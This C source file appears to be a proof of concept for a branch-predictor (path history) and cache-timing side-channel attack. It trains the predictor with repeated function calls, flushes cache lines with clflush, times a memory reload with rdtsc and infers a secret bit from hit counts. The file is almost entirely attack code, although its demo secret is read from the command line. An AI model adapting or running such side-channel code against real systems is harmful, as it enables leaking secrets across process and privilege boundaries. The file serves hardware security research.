#include "Attacker.h"
#include "Victim_if.h"
#include <x86intrin.h>
#include <stdio.h>
#include <time.h>

unsigned char attacker_array[BYTE_MAX*Cache_Line];
int times[BYTE_MAX];

#define flush(ptr) \
    asm volatile( \
        "clflush (%0)\n"\
        : \
        : "c" (ptr) \
    )

#define min(x, y) (x) < (y) ? (x) : (y)

int PHR_Flush(int length, int callLen) {
    int i;
    volatile int temp = 3;
    for(i = 0; i < PHR_LEN+1; i++)
        i += (i+1)/(i+1)-1;
    asm volatile("mfence");
    
    temp+=func(callLen);
    temp += (temp+1)/(temp+1)-1;
    temp += (temp+1)/(temp+1)-1;
    temp += (temp+1)/(temp+1)-1;
    asm volatile("mfence");
    for (i = 0; i < PHR_LEN-3; i++)
        i += (i+1)/(i+1)-1;
    asm volatile("mfence");
    if (length) 
        temp += attacker_array[1*Cache_Line];
    return temp;
}

int main(int argc, char* argv[]) {
    unsigned long long start, end, matgin, ttm0, ttm1;
    unsigned char temp;
    unsigned long long sum0, sum1;
    clock_t st_ck, ed_ck;
    sum0 = ttm0 = 0;
    sum1 = ttm1 = 0;
    int secret;
    volatile int tmp = 0;
    if(argc >= 2)
        secret = atoi(argv[1]); // secret == 1 / 0
    else secret = 0;
    st_ck = clock();
    for (int k = 0; k < ATK_ROUNDS; k++) {
        for (int j = 0; j < PHR_TRAIN_ROUNDS; j++) {
            tmp+=PHR_Flush(0, 0); // secret == 0, length == 0 ====> not access attacker_array
            tmp+=PHR_Flush(1, 1); // secret == 1, length == 1 ====> access attacker_array
        }

        // attacker retrieve
        flush(attacker_array+0*Cache_Line);
        flush(attacker_array+1*Cache_Line);
        // trigger victim
        // flush(&length);
        tmp+=PHR_Flush(0, secret); 
        unsigned int tsc_aux;
        asm volatile("mfence");
        start = __rdtsc();
        temp = *(unsigned char*)(attacker_array+1*Cache_Line);
        end = __rdtscp(&tsc_aux);
        asm volatile("lfence");
        // asm volatile("mfence");
        matgin = end - start;
	if(matgin <= HIT_THRESHOLD){
	 	sum0 += matgin;
	 	ttm0 ++;
	}
	else{
		sum1 += matgin;
		ttm1 ++;
	}
        times[1] += (end-start) <= HIT_THRESHOLD;
    }
    if (times[1] >= TIMES_THRESHOLD)
        printf("confidence [%d] hit at: 1, means secret equals 1\n", times[1]);
    else
        printf("confidence [%d] hit at: 1, means secret equals 0\n", times[1]);
    return 0;
}
